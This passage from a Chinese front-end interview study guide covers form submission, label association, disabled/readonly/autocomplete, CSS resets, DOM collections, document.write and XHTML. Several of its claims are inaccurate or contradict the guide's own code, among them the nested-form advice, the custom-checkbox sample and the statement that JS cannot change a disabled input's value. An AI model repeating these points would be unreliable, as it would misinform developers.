  // 验证通过，走默认提交流程（但可改为 fetch 提交）
  e.preventDefault(); // SPA 中通常改为 AJAX 提交
  submitViaAjax(new FormData(e.target as HTMLFormElement));
};
```

## 16.7 表单隐式提交（Implicit Submission）

W3C 规范定义的机制：当用户在文本输入框中按 Enter 键时，浏览器自动触发表单的默认提交按钮。

```
触发条件：
1. 表单内有 <input type="submit"> 或 <button type="submit">
2. 焦点在表单内任意文本输入框
3. 用户按 Enter 键

→ 浏览器模拟触发 default button 的 click 事件
```

```html
<!-- 隐式提交示例 -->
<form action="/search">
  <input type="text" name="q" /> <!-- Enter 键自动提交 -->
  <button type="submit">Search</button>
</form>
```

## 16.8 常见陷阱

```javascript
// 陷阱1: fetch 手动设置 Content-Type
fetch('/api/upload', {
  method: 'POST',
  body: formData,
  headers: {
    'Content-Type': 'multipart/form-data', // ❌ 错误！缺少 boundary
  },
});
// ✅ 不写 Content-Type，让浏览器自动生成含 boundary 的 Content-Type

// 陷阱2: disabled 表单元素不参与提交
// disabled 的 input 在表单提交时不会包含其值
// ✅ 解决方案：使用 readonly 替代，或通过 hidden input 传递值

// 陷阱3: enctype 不匹配文件上传
<form method="POST" enctype="application/x-www-form-urlencoded">
  <input type="file" name="avatar" />  <!-- ❌ 文件不会上传！ -->
</form>
// ✅ 必须改为 enctype="multipart/form-data"

// 陷阱4: form 嵌套导致提交混乱
<form>
  <form> <!-- ❌ 嵌套 form 会被浏览器忽略，inner form 失效 -->
    ...
  </form>
</form>
// ✅ 最多嵌套一层，或使用 fieldset 分组
```

## 16.9 面试 follow-up 问题

### Q1: 表单的 `enctype` 为 `multipart/form-data` 时，请求体是如何构建的？boundary 字符串的作用是什么？

**答案：**
`multipart/form-data` 将表单数据拆分为多个独立部分，每个部分用 `boundary` 字符串作为分隔符：

```
--{boundary}                          ← 开始边界
Content-Disposition: form-data; name="field1"
Value1
--{boundary}
Content-Disposition: form-data; name="file"; filename="a.png"
Content-Type: image/png
[二进制数据]
--{boundary}--
```

`boundary` 是服务器在解析时用来分割不同字段的标记。浏览器自动生成随机字符串（如 `----WebKitFormBoundary7MA4YWxTrZu0gW`），确保不会与用户输入的内容冲突。

---

### Q2: 为什么用 fetch + FormData 上传文件时，不应该手动设置 `Content-Type` header？

**答案：**
`Content-Type: multipart/form-data` 必须包含 `boundary=xxx` 参数才能被服务器正确解析：

```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxTrZu0gW
```

如果手动写 `Content-Type: multipart/form-data` 而不带 boundary，服务器将无法解析。如果手动写完整的 `Content-Type`（含 boundary），则需要确保 boundary 正确且一致，过于复杂。

正确做法：**让浏览器自动生成**，不写 `Content-Type` header。浏览器会自动处理：

```javascript
fetch('/api/upload', {
  method: 'POST',
  body: formData,
  // 不写 headers！浏览器自动添加带 boundary 的 Content-Type
});
```

---

### Q3: `preventDefault` 在表单提交事件中的正确用法是什么？和 `return false` 有什么区别？

**答案：**
在 `addEventListener` 中，`e.preventDefault()` 阻止默认行为（浏览器提交表单并跳转）；`return false` 不起作用。

```javascript
form.addEventListener('submit', (e) => {
  e.preventDefault(); // ✅ 正确：阻止默认提交，进行 AJAX 提交
  fetch('/api/submit', { method: 'POST', body: new FormData(form) });
});
```

在 HTML `onsubmit="return false"` 中，`return false` 等价于 `preventDefault`（同时也阻止冒泡，仅限 jQuery）。

现代 SPA 中通常用 `e.preventDefault()` 阻止默认跳转，通过 AJAX/Fetch 提交数据，实现无刷新体验。

---

### Q4: 表单的原生验证 `checkValidity()` 和 `reportValidity()` 有什么区别？在 React 中如何使用？

**答案：**
- `checkValidity()`：仅检查，返回 boolean，不显示错误提示
- `reportValidity()`：检查并显示浏览器原生错误气泡

```typescript
// 在 React 中使用
const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
  const form = e.currentTarget;

  // 方案1: 手动检查
  if (!form.checkValidity()) {
    form.reportValidity(); // 显示错误气泡
    return;
  }

  // 方案2: 直接报告（自动 check + 显示）
  if (!form.reportValidity()) {
    return;
  }

  // 通过验证，继续提交
  submitForm(new FormData(form));
};
```

---

> 📚 参考：
> - https://www.runoob.com/tags/att-form-enctype.html （form enctype 属性）
> - https://cloud.tencent.com/developer/article/2579682 （enctype 详细解析）
> - https://blog.csdn.net/weixin_39568133/article/details/117801966 （form 隐式提交）
> - https://blog.csdn.net/qq_34573534/article/details/97613322 （input 表单详解）
> - https://blog.csdn.net/truong/article/details/8296018 （multipart/form-data 详解）
> - https://blog.csdn.net/weixin_42289080/article/details/140204145 （React DOMPurify）

---

# Section 17: label 关联 input 原理

## 17.1 两种关联方式

### 显式关联（for/id）

```html
<label for="username">Username</label>
<input type="text" id="username" name="username" />
```

### 隐式关联（包裹）

```html
<label>
  Username
  <input type="text" name="username" />
</label>
```

### 结构对比

```
显式关联：
+------------------------------------------+
| <label for="username">  ←──[for 属性]──┐ |
|                                          │ 点击 label
| <input id="username">  ──────────────────┘ |
+------------------------------------------+  触发 input#username 焦点

隐式关联：
+------------------------------------------+
| <label>                                   |
|   Username                                |
|   <input type="text">  ←──[自动关联]──┘  |
| </label>                                  |
+------------------------------------------+
```

## 17.2 点击区域扩展机制

`<label>` 的核心特性：**点击 label 等价于点击对应的 input**。

### 隐式关联的自动匹配

HTML 规范自动将 `<label>` 内的第一个可关联后代 input/select/textarea 与该 label 关联：

```html
<!-- ✅ 关联成功 -->
<label>
  Email:
  <input type="email" />
</label>

<!-- ✅ 也关联成功（嵌套层级） -->
<label>
  Details:
  <span>
    <textarea></textarea>
  </span>
</label>
```

### 可关联的控件类型

| 控件 | label 行为 |
|------|-----------|
| `<input>` (非 hidden) | ✅ 触发聚焦（type=text/email/password/number 等） |
| `<input type="checkbox">` | ✅ 触发切换选中状态 |
| `<input type="radio">` | ✅ 触发选中（同 name 组） |
| `<input type="range">` | ✅ 触发聚焦 |
| `<select>` | ✅ 触发下拉展开 |
| `<textarea>` | ✅ 触发聚焦 |
| `<output>` | ✅ 关联但无交互效果 |
| `<input type="hidden">` | ❌ 不关联 |

## 17.3 label 的 control 属性

JS 中可通过 `label.control` 直接访问关联的控件：

```javascript
const label = document.querySelector('label[for="username"]');
const input = label.control; // 等同于 document.getElementById('username')
input.focus();
input.disabled = false;
```

```typescript
// TypeScript 类型
const label = document.querySelector('label') as HTMLLabelElement;
const ctrl = label.control; // HTMLElement | null

// 通过 label 点击切换 checkbox
const toggleViaLabel = (labelEl: HTMLLabelElement) => {
  const input = labelEl.control as HTMLInputElement | null;
  if (input?.type === 'checkbox') {
    input.checked = !input.checked;
    // 触发 change 事件
    input.dispatchEvent(new Event('change', { bubbles: true }));
  }
};
```

## 17.4 显式 vs 隐式关联对比

| 维度 | 显式关联（for/id） | 隐式关联（包裹） |
|------|------------------|----------------|
| 代码结构 | 分离（可跨层级） | 必须嵌套 |
| 灵活性 | ✅ 高（可远距离） | ❌ 必须相邻 |
| 可维护性 | ✅ ID 唯一性好管理 | ✅ 结构直观 |
| 样式控制 | ✅ label/input 可独立布局 | ✅ 整体布局 |
| 表单辅助软件 | ✅ 完全支持 | ✅ 完全支持 |
| 点击区域 | 等于 label 区域 | 等于 label 区域 |
| 多控件 | ❌ 一个 label 对应一个控件 | ✅ 可对应多个控件（仅第一个生效） |
| 隐式提交 | ✅ 参与 | ✅ 参与 |

## 17.5 无障碍（Accessibility）

### 屏幕阅读器行为

屏幕阅读器读取表单时，会将 label 的文本与 input 关联播报：

```
VoiceOver (macOS): "Username, text field, edit text"
NVDA (Windows): "Username 编辑文本  输入"
JAWS: "Username, 文本输入框"
```

### 必须使用 label 的场景

```html
<!-- ❌ 无 label：屏幕阅读器只知道"edit text" -->
<input type="email" placeholder="your@email.com" />

<!-- ✅ 有 label：屏幕阅读器播报完整语义 -->
<label for="email">Email address</label>
<input id="email" type="email" placeholder="your@email.com" />
```

## 17.6 面试 follow-up 问题

### Q1: `<label>` 点击时底层是如何触发对应 input 聚焦的？和直接点击 input 有什么区别？

**答案：**
底层机制：点击 label 时，浏览器自动将 `click` 事件转发给关联的 input 控件（通过 `for/id` 或 DOM 树查找），input 接收到 click 后执行自己的默认行为（聚焦、切换 checked 状态）。

从 input 的角度来看，点击 label 触发 input 聚焦，与直接点击 input 效果**完全相同**（触发同一套 focus/click 事件序列）。唯一区别是事件 target 不同：
- 直接点击 input：事件 target 是 input
- 点击 label：事件 target 先是 label，然后转发到 input

这也是为什么 `label.control` 能直接访问 input — 关联关系在 DOM 解析阶段就已建立。

---

### Q2: 如果一个 label 包裹了多个 input，哪个会被触发？如何在同一个 label 内关联多个控件？

**答案：**
根据 HTML 规范，label 只关联其包裹的第一个可关联控件。后续控件不受该 label 控制。

```html
<!-- ❌ 只有第一个 checkbox 会被 label 控制 -->
<label>
  <input type="checkbox" /> Select all
  <input type="checkbox" /> Option 1  <!-- 不受 label 控制！ -->
</label>
```

正确做法：每个控件拆分独立 label，或使用 fieldset 分组。

---

### Q3: 如何实现自定义样式的 checkbox/radio，使其点击区域最大化（可访问）？

**答案：**
核心技巧：**将原生 input 放在 label 内并隐藏**（不用 `display:none`），而是用 `opacity:0` + `position:absolute` 保持可交互：

```html
<label class="custom-checkbox">
  <input type="checkbox" hidden />
  <span class="checkmark"></span>
  <span class="text">I accept the terms</span>
</label>
```

关键点：
1. input 必须在 label 内（自动关联，无需 `for/id`）
2. 用 `opacity:0` 而非 `display:none`（保持可访问）
3. 点击区域 = 整个 `.custom-checkbox` = 整行，最大化可点击面积

---

> 📚 参考：
> - https://www.w3.org/TR/html52/sec-forms.html#implicit-submission
> - https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-describedby
> - https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-labelledby

---

# Section 18: disabled vs readonly vs autocomplete

## 18.1 disabled vs readonly 核心区别

### 属性对比表

| 维度 | `disabled` | `readonly` |
|------|-----------|-----------|
| 可编辑 | ❌ 完全不可编辑 | ✅ 不可编辑，但可聚焦 |
| 可复制 | ❌ 不可选择、复制 | ✅ 可选择、复制 |
| 提交到服务器 | ❌ **不提交** | ✅ **提交** |
| Tab 键可聚焦 | ❌ 跳过 | ✅ 可以聚焦 |
| 表单验证 | ❌ 跳过 | ✅ 参与 |
| CSS 默认样式 | 灰色、不可用 | 正常样式 |
| JS 可修改值 | ❌ readOnly 不可用 setter | ✅ 可修改 |
| 适用元素 | 所有表单元素 | `input` + `textarea` |

## 18.2 视觉样式差异

```css
/* 默认 disabled 样式 */
input:disabled {
  opacity: 0.6;
  cursor: not-allowed;
  background-color: #e0e0e0;
}

/* readonly 样式（需手动设置） */
input:read-only {
  background-color: #f5f5f5;
  cursor: default;
}
```

## 18.3 autocomplete 属性详解

### autocomplete 值与 name 属性映射表

| autocomplete 值 | 对应字段 | 触发条件 |
|----------------|---------|----------|
| `name` | 全名 | — |
| `given-name` | 名 | — |
| `email` | 邮箱 | — |
| `username` | 用户名 | — |
| `current-password` | 当前密码 | 登录页 |
| `new-password` | 新密码/确认密码 | 注册/修改密码页 |
| `off` | 关闭自动填充 | 任何敏感字段 |

### new-password 防止自动填充

```html
<!-- 方法1: 直接设置 autocomplete -->
<input type="password" autocomplete="new-password" />

<!-- 方法2: 配合 display:none 的虚假 input -->
<input type="password" style="display:none" name="fake-password" />
<input type="password" name="real-password" />
```

## 18.4 disabled / readonly / autocomplete 组合使用

```html
<!-- 场景：查看模式 + 部分字段可编辑 -->
<form>
  <!-- 只读字段：用户信息，不可编辑 -->
  <input type="text" value="user@example.com" readonly />

  <!-- 禁用字段：管理员不可修改的系统字段 -->
  <input type="text" value="admin" disabled />

  <!-- 可编辑字段 -->
  <input type="text" name="display-name" autocomplete="name" />

  <!-- 新密码设置 -->
  <input type="password" name="new-password" autocomplete="new-password" minlength="8" required />
</form>
```

## 18.5 常见陷阱

```javascript
// 陷阱1: disabled 的 input 值不提交
<form method="POST" action="/update">
  <input type="hidden" name="user-id" value="42" />  <!-- ✅ 解决方案：用 hidden 传值 -->
  <input type="text" name="name" disabled />          <!-- name 字段不提交 -->
</form>

// 陷阱2: autocomplete 失效
// 常见原因：input 在 display:none 的容器内 / name 属性名不标准 / 全局 autocomplete="off"

// 陷阱3: disabled 的 radio/checkbox 仍可能被 label 切换
input:disabled { pointer-events: none; }  // 配合防止切换
```

## 18.6 面试 follow-up 问题

### Q1: 为什么 disabled 的表单元素不提交值，但 readonly 的会？

**答案：**
根据 HTML 规范，`disabled` 的元素不是 **successful**（成功的）表单控件，不参与表单提交序列化。`readonly` 仍属于 successful 控件。

| 场景 | disabled | readonly |
|------|----------|----------|
| 编辑已有数据时传递 ID | ✅ 用 hidden input 传值 | ✅ 直接传值 |
| 表单验证 | ❌ 跳过 | ✅ 参与 |

---

### Q2: `autocomplete="new-password"` 失效时有哪些替代方案？

**答案：**
1. **添加虚假 password input**：浏览器填充假 input，真实 input 保持空白
2. **动态生成 name 属性**：如 `pwd_${Date.now()}`
3. **确保 form action 正确**：action="/register" + name="password"

---

### Q3: 如何实现一个"条件只读"字段——当用户未勾选某 checkbox 时 readonly，勾选后变为可编辑？

**答案：**
```tsx
const ConditionalEditable = () => {
  const [agreed, setAgreed] = useState(false);
  const [feedback, setFeedback] = useState('');

  return (
    <form>
      <label>
        <input type="checkbox" checked={agreed} onChange={(e) => setAgreed(e.target.checked)} />
        I agree to provide feedback
      </label>

      <textarea
        name="feedback"
        value={feedback}
        onChange={(e) => setFeedback(e.target.value)}
        readOnly={!agreed}
        disabled={!agreed}
        placeholder={agreed ? '' : 'Agree above to enable'}
      />

      <input type="hidden" name="feedback" value={feedback} />
    </form>
  );
};
```

---

> 📚 参考：
> - https://cloud.tencent.com/developer/article/2544332
> - https://blog.csdn.net/zcy_wxy/article/details/80550665
> - https://blog.csdn.net/lxx_110/article/details/132958800
> - https://cloud.tencent.com/developer/article/2522332
```

---

# Section 19: 清除浏览器默认样式

## 19.1 为什么浏览器有默认样式

浏览器的 **User Agent Stylesheet**（浏览器内置样式表）是 HTML 规范的刻意设计，目的是在没有自定义 CSS 的情况下，让文档「看起来能看」。核心目的：

1. **基本可读性**：段落有间距、标题有字号，链接有颜色
2. **语义传达**：不同标签在视觉上有所区分
3. **向后兼容**：早期互联网页面不依赖外链 CSS，内置样式是唯一样式来源

---

## 19.2 normalize.css vs reset.css vs sanitize.css

### CSS Reset（重置样式）

**理念**：先破后立 —— 把所有浏览器默认样式全部清零，再自行按需重建。

```css
/* 最简化的 reset */
*, *::before, *::after {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

/* YUI3 Reset 核心代码 */
body, div, dl, dt, dd, ul, ol, li,
h1, h2, h3, h4, h5, h6,
pre, form, fieldset, input, textarea, p, blockquote, th, td {
  margin: 0; padding: 0;
}
table { border-collapse: collapse; border-spacing: 0; }
fieldset, img { border: 0; }
img { display: block; }
ol, ul { list-style: none; }
```

**缺点**：暴力清零，丢失有用的默认样式（button、input 的系统外观）。

### normalize.css（规范化样式）

**理念**：保留有用的浏览器默认样式，消除浏览器差异，修复跨浏览器 bug。

```css
/* normalize.css 核心示例 */
button {
  overflow: visible; /* IE 修复 */
  -webkit-appearance: button; appearance: button;
}
img { border-style: none; vertical-align: middle; }
a { color: inherit; text-decoration: none; }
main, header, nav, section, article, aside, footer {
  display: block; /* IE9 及之前需要 */
}
```

被用于 Twitter Bootstrap、HTML5 Boilerplate、GOV.UK。

### sanitize.css

**理念**：在 normalize.css 基础上，额外处理无障碍（Accessibility）和安全性。

```css
/* sanitize.css 额外处理 */
img, video, svg { max-width: 100%; height: auto; }
[hidden] { display: none !important; }
input, button, select, textarea {
  font-family: inherit; font-size: inherit;
  line-height: inherit; color: inherit;
}
```

---

## 19.3 常见默认样式清除

```css
/* 移除列表标记 */
ul, ol { list-style: none; }

/* 图片：去除底部间隙（行内块元素默认 baseline 对齐） */
img, video { display: block; width: 100%; }

/* 去除 a 和 button 的默认样式 */
a { color: inherit; text-decoration: none; }
button { font: inherit; cursor: pointer; border: none; background: none; }

/* 表格：合并边框 */
table { border-collapse: collapse; }

/* 表单元素 */
input, textarea, select {
  font: inherit;
  outline: none; /* 通常需要自定义 focus 样式 */
}

/* 隐藏元素但保持可访问性 */
.sr-only {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border: 0;
}
```

## 19.4 面试 follow-up 问题

### Q1: CSS Reset 和 normalize.css 各自适合什么场景？

**答案：**
- **CSS Reset**：适合完全自定义 UI 的项目（如设计系统、组件库），需要从零构建所有样式。缺点是会丢失浏览器原生的 button/input 样式，需要自己实现。
- **normalize.css**：适合需要保留部分原生行为但消除浏览器差异的项目（如内容型网站、CMS），或依赖浏览器原生表单控件的场景。

---

### Q2: `box-sizing: border-box` 为什么推荐全局设置？

**答案：**
传统 `content-box`（标准盒模型）让 width/height 只包含内容区，padding 和 border 会撑大元素，导致布局计算复杂（特别是需要精确计算宽度的场景）。

`border-box` 让 width/height 包含 padding 和 border，布局更直观：

```css
/* content-box: width=200px + padding:40px + border:4px = 244px 实际宽度 */
.box1 { width: 200px; padding: 20px; border: 2px solid #333; }

/* border-box: width=200px 包含 padding 和 border */
.box2 { box-sizing: border-box; width: 200px; padding: 20px; border: 2px solid #333; }
```

现代 CSS 框架（Bootstrap、Tailwind）默认使用 `border-box`，已成为事实标准。

---

### Q3: `.sr-only` 的作用是什么？为什么不用 `display:none`？

**答案：**
`.sr-only`（Screen Reader Only）让元素视觉上隐藏但仍可被屏幕阅读器读取：

| 方式 | 视觉隐藏 | 屏幕阅读器 | 搜索引擎 |
|------|---------|-----------|---------|
| `display:none` | ✅ | ❌ 不读 | ❌ 不索引 |
| `visibility:hidden` | ✅ | ❌ 不读 | ❌ 不索引 |
| `opacity:0` | ✅ | ⚠️ 取决于实现 | ✅ 索引 |
| `.sr-only` | ✅ | ✅ 读 | ✅ 索引 |

典型场景：图标按钮（`<button><svg>🔍</svg></button>`）需要为屏幕阅读器提供 "搜索" 文本。

---

> 📚 参考：
> - https://necolas.github.io/normalize.css/ （normalize.css 官方）
> - https://github.com/csstools/sanitize.css （sanitize.css）
> - https://github.com/sindresorhus/modern-normalize （modern-normalize）
> - https://blog.csdn.net/weixin_43964169/article/details/126296426 （CSS Reset）

---

# Section 20: HTMLCollection vs NodeList 区别

## 20.1 核心区别

| 特性 | HTMLCollection | NodeList |
|------|----------------|----------|
| 获取方式 | `getElementsByTagName`等 | `querySelectorAll` |
| 包含节点类型 | 仅 Element 节点 | 任意节点类型（Element/Text/Comment等） |
| 是否实时 | **实时**（live，DOM 变化时自动更新） | **静态**（static，DOM 变化不自动更新） |
| 支持方法 | `namedItem()` | `forEach`, `entries`, `keys`, `values` |
| 有长度 | 有 `.length` | 有 `.length` |
| 可枚举 | 可（但不是 Array） | 可（但不是 Array） |

## 20.2 Live vs Static 行为演示

```javascript
const divs = document.getElementsByTagName('div'); // HTMLCollection（实时）
const spans = document.querySelectorAll('span');    // NodeList（静态）

// HTMLCollection 是实时的
document.body.appendChild(document.createElement('div'));
console.log(divs.length); // 增加 1（实时更新！）

// NodeList 是静态的
document.body.appendChild(document.createElement('span'));
console.log(spans.length); // 不变（快照）

// 都不是真正的数组
divs.push(); // 报错：HTMLCollection 没有 push

// 转为数组
const arr = Array.from(divs);
const arr2 = [...divs];
const arr3 = Array.prototype.slice.call(divs);

// NodeList 支持 forEach（现代浏览器）
spans.forEach(el => console.log(el));
```

## 20.3 childNodes vs children

```javascript
element.childNodes;   // NodeList，包含所有节点（包括文本/注释）
element.children;     // HTMLCollection，只包含 Element 子节点（实时）

// 示例
<div id="container">
  文本节点
  <span>元素节点</span>
  <!-- 注释节点 -->
</div>

container.childNodes.length;  // 5 (文本 + span + 文本 + 注释 + 文本)
container.children.length;    // 1 (只有一个 span 元素)
```

## 20.4 性能与内存影响

| 场景 | HTMLCollection | NodeList |
|------|--------------|----------|
| 频繁 DOM 操作 | ⚠️ 实时更新导致额外开销 | ✅ 快照，无额外开销 |
| 静态内容遍历 | ❌ 每次访问都重新计算 | ✅ 一次性快照 |
| 缓存引用 | ⚠️ 每次访问 live 结果 | ✅ 稳定引用 |
| 适合场景 | 需要实时反映 DOM 变化的场景 | 大部分场景（推荐 querySelectorAll） |

```typescript
// ⚠️ HTMLCollection 在循环中可能出问题
const divs = document.getElementsByTagName('div');
for (let i = 0; i < divs.length; i++) {
  // 如果循环中删除 div，length 会实时变化，导致跳过元素
}

// ✅ 安全做法：先转为数组
const divsArr = Array.from(document.getElementsByTagName('div'));
for (const div of divsArr) {
  // 安全删除，不会跳过
  if (shouldRemove(div)) div.remove();
}

// ✅ 或者从后往前删（live collection）
while (divs.length > 0) {
  divs[0].remove(); // 每次移除第一个，length 减小
}
```

## 20.5 namedItem 方法

HTMLCollection 有 `namedItem()` 方法，通过 name 或 id 获取元素：

```javascript
// HTMLCollection 有 namedItem
const forms = document.forms; // HTMLCollection of forms
const myForm = forms.namedItem('myForm'); // 获取 name="myForm" 的表单

// NodeList 没有 namedItem，但可以用多种方式访问
const buttons = document.querySelectorAll('.btn');
const first = buttons[0];           // 数组索引
const named = document.querySelector('[name="save-btn"]'); // CSS 选择器
```

## 20.6 面试 follow-up 问题

### Q1: 为什么 HTMLCollection 是"实时"的？这种设计有什么优缺点？

**答案：**
HTMLCollection 内部维护了对 DOM 树的实时引用。当 DOM 变化时，HTMLCollection 自动更新，无需重新查询。

**优点：**
- 始终反映 DOM 最新状态，不需要手动刷新
- 适合需要实时监听 DOM 变化的场景

**缺点：**
- 每次访问 `.length` 或索引时，都会重新计算（遍历底层引用）
- 在循环中修改 DOM 时可能导致意外行为（跳过元素）
- 内存占用比静态 NodeList 高（需要维护引用）

---

### Q2: `querySelectorAll` 返回的 NodeList 真的是"静态"的吗？

**答案：**
在现代浏览器中，`querySelectorAll` 返回的 NodeList 是**静态的**（snapshot），DOM 变化不会影响已返回的 NodeList 内容。

但需要注意：
1. **子 NodeList** 可能不是静态的：`element.childNodes` 返回的 NodeList 在某些场景下是 live 的（规范允许）
2. **旧版浏览器**（如 IE）行为可能不同
3. **TreeWalker/NodeIterator** 返回的不是 NodeList

---

### Q3: 如何安全地遍历可能动态变化的集合？

**答案：**
方案一：转为数组（创建快照）
```javascript
const arr = [...collection]; // 或 Array.from(collection)
arr.forEach(item => process(item));
```

方案二：从后往前遍历（避免跳过）
```javascript
for (let i = collection.length - 1; i >= 0; i--) {
  process(collection[i]);
}
```

方案三：while 循环
```javascript
while (collection.length > 0) {
  process(collection[0]);
  collection[0].remove(); // 移除后，集合自动更新
}
```

---

> 📚 参考：
> - https://developer.mozilla.org/en-US/docs/Web/API/HTMLCollection
> - https://developer.mozilla.org/en-US/docs/Web/API/NodeList
> - https://blog.csdn.net/weixin_43807979/article/details/123851813
> - https://blog.csdn.net/weixin_43317551/article/details/125519289

---

# Section 21: document.write 为什么不推荐

## 21.1 document.write 的问题

### 问题详解

```javascript
// 不推荐的原因：
document.write('<script>alert(1)</script>');

// 1. 同步覆盖页面内容（如果在页面加载后调用，会清空整个文档）
if (condition) {
  document.write('<h1>条件内容</h1>'); // 慎用！
}

// 2. 阻塞页面解析和渲染
// 3. 无法进行错误处理
// 4. 无法利用 CSP（Content Security Policy）
// 5. 违背了 DOM 编程模型
```

### document.write 时机行为

```
页面加载中调用 document.write：
→ 追加到当前解析位置继续解析

页面加载完成后调用 document.write：
→ 调用 document.open() 清空当前文档
→ 重新开始解析（等同于重新加载页面）
→ 之前的 DOM 树、事件监听全部丢失
```

```javascript
// 危险演示
document.addEventListener('DOMContentLoaded', () => {
  document.write('<p>Hello</p>'); // 清除整个页面！
  // 之前的 DOM 树消失
  // 之前的事件监听器消失
  // 页面重新开始渲染
});
```

## 21.2 CSP 限制

Content Security Policy (CSP) 会阻止 `document.write`：

```html
<!-- CSP 策略阻止内联脚本和外链 document.write -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
<!-- 任何 document.write 都会被 CSP 拦截 -->
```

现代浏览器越来越倾向于弃用 `document.write`，原因：
1. **安全风险**：XSS 攻击常用手段
2. **性能问题**：同步阻塞解析
3. **与现代 Web 不兼容**：模块系统、async/defer 等机制无法配合

## 21.3 现代替代方案

```javascript
// 替代 document.write 的正确方式
const container = document.getElementById('root');

// 方式1：innerHTML
container.innerHTML = '<p>动态内容</p>';

// 方式2：createElement（更安全）
const p = document.createElement('p');
p.textContent = '安全文本';
container.appendChild(p);

// 方式3：insertAdjacentHTML（性能更好，插入位置可选）
container.insertAdjacentHTML('beforeend', '<p>追加内容</p>');
// 位置：'beforebegin' | 'afterbegin' | 'beforeend' | 'afterend'

// 方式4：template 元素（适合复杂结构）
const template = document.createElement('template');
template.innerHTML = '<p>Template content</p>';
container.appendChild(template.content.cloneNode(true));
```

### React/Vue 中的替代

```tsx
// React: 使用 JSX
function App() {
  const [show, setShow] = useState(false);
  return show ? <p>Dynamic content</p> : null;
}

// Vue: 使用 v-if/v-show
// <p v-if="show">Dynamic content</p>

// 绝对不要在 React 中使用 document.write
// 它会破坏虚拟 DOM 机制
```

## 21.4 面试 follow-up 问题

### Q1: 如果页面加载完成后调用 `document.write`，实际会发生什么？

**答案：**
页面加载完成后调用 `document.write` 实际上等同于：

1. 隐式调用 `document.open()` — 清空当前文档（包括 DOM 树）
2. 将新内容写入文档流
3. 触发新的页面解析和渲染流程

**后果：**
- 当前页面的 DOM 树完全销毁
- 所有 JavaScript 变量和状态丢失
- 所有事件监听器被解除
- 页面 URL 保持不变（不是真正的页面跳转）
- 如果在 `window.onload` 之后调用，浏览器行为不可预测

```javascript
// 实际效果等同于
document.open(); // 清除文档
document.write('<p>New content</p>');
document.close(); // 结束写入
```

---

### Q2: 有什么场景必须用 `document.write` 吗？

**答案：**
几乎没有。现代 Web 开发中，**没有任何场景必须使用 `document.write`**。

可能的遗留场景：
1. **极老项目的书签脚本**（bookmarklet）
2. **CDN 注入脚本的简单方案**（但有安全风险）
3. **测试/调试时的快速注入**（仅开发阶段）

**替代方案总结：**

| 场景 | document.write | 现代替代 |
|------|--------------|---------|
| 动态插入内容 | `doc.write('<div>')` | `innerHTML` / `createElement` |
| 延迟加载脚本 | `doc.write('<script src=...>')` | `dynamic import` / `JSONP` |
| 第三方脚本注入 | `doc.write(script)` | `appendChild(createElement('script'))` |
| 书签脚本 | `doc.write(...)` | `body.insertAdjacentHTML` |

---

> 📚 参考：
> - https://developer.mozilla.org/en-US/docs/Web/API/Document/write
> - https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
> - https://blog.csdn.net/weixin_45517869/article/details/123851813
> - https://blog.csdn.net/qq_43522036/article/details/122890463

---

# Section 22: XHTML vs HTML vs XML vs JSON

## 22.1 核心对比表

| 特性 | HTML | XHTML | XML | JSON |
|------|------|-------|-----|------|
| 设计目的 | 显示 Web 页面 | 结构化 Web 内容 | 传输/存储数据 | 传输数据 |
| 语法严格性 | 宽松（容错性强） | 严格（必须闭合标签） | 极度严格 | 语法简洁 |
| 大小写敏感 | 不敏感 | 敏感（必须小写） | 敏感 | 敏感 |
| 引号 | 可省略 | 必须双引号 | 必须双引号 | 字符串必须双引号 |
| 标签闭合 | 不强制 | 必须闭合 | 必须闭合 | 无标签 |
| 属性写法 | `disabled` | `disabled="disabled"` | — | — |
| 根元素 | 可省略 | 必须有 | 必须有 | 必须是对象或数组 |
| 空白处理 | 折叠 | 保留 | 保留 | 取决于具体实现 |
| 解析方式 | 浏览器容错解析 | XML 解析器 | XML 解析器 | JSON.parse() |
| 校验 | 不强制 | 可用 DTD/Schema | DTD/Schema | JSON Schema |

## 22.2 HTML vs XHTML 深度对比

### HTML5 宽松语法

```html
<!DOCTYPE html>
<html>
<head><title>HTML</title>
<body>
  <input type="checkbox" checked>  <!-- 属性可省略值 -->
  <img src="a.jpg">                 <!-- 自闭合标签可省略斜杠 -->
  <br>                              <!-- 单标签不用 /> -->
  <p>段落                            <!-- 未闭合标签浏览器容错处理 -->
</body>
```

### XHTML 严格语法

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>XHTML</title></head>
<body>
  <input type="checkbox" checked="checked" />  <!-- 属性必须有值 -->
  <img src="a.jpg" alt="图片" />               <!-- 必须有斜杠 -->
  <br />                                       <!-- 自闭合必须 /> -->
  <p>段落</p>                                  <!-- 必须闭合标签 -->
  <div class="box"></div>                       <!-- 双标签也要闭合 -->
</body>
</html>
```

### 为什么 XHTML 被淘汰

```
XHTML 目标：让 HTML 符合 XML 严格语法
↓ 
实际结果：
1. 浏览器为了兼容性，仍需要"容错"解析 XHTML
2. 严格的语法要求让开发成本提高
3. HTML5 出现后，统一了"宽松但有规则"的语法
4. XHTML 2.0 被废弃，HTML5 成为标准

HTML5 的设计哲学：
- 宽松语法 + 明确规范
- 浏览器统一容错规则（HTML 解析算法）
- 向后兼容 + 新特性（video/canvas/web components）
```

## 22.3 XML 详解

### XML 语法要求

```xml
<!-- XML 必须有且只有一个根元素 -->
<root>
  <child>内容</child>
</root>

<!-- 标签必须成对 -->
<tag></tag>
<self-closing />

<!-- 属性必须加引号 -->
<element attr="value" />

<!-- 大小写敏感 -->
<Book> ≠ <book>

<!-- CDATA 区块：包含特殊字符的内容 -->
<data><![CDATA[
  <script>这里可以写 < > & 不需要转义</script>
]]></data>

<!-- XML 声明（可选但推荐） -->
<?xml version="1.0" encoding="UTF-8"?>
```

### XML 用途（现代场景）

| 场景 | 为什么用 XML | 替代方案 |
|------|-------------|---------|
